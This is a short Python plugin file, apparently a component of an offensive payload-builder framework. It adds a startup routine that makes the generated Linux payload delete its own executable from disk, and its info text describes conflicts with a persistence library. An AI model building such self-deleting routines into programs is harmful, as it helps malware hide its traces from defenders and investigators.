# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('import os')
        self.config.import_statements.append('import sys')
        self.config.startup_end.append('self_delete_startup()')
        self.config.functions.append('''
def self_delete_startup():
    os.remove(os.path.abspath(sys.argv[0]))
''')
    elif option == 'info':
        self.log.blank('\nName             : Self deleter startup component' \
                       '\nOS               : Linux' \
                       '\nRequired Modules : os, sys' \
                       '\nCommands         : NIL (Runs at startup)' \
                       '\nDescription      : Deletes the payload off the disk' \
                       '\nNote             : Persistence library will NOT work due to the file being deleted off of disk')
        return {
            "Name": "Self deleter startup component",
            "OS": "Linux",
            "Required Modules": "os, sys",
            "Commands": "NIL (Runs at startup)",
            "Description": "Deletes the payload off the disk"
        }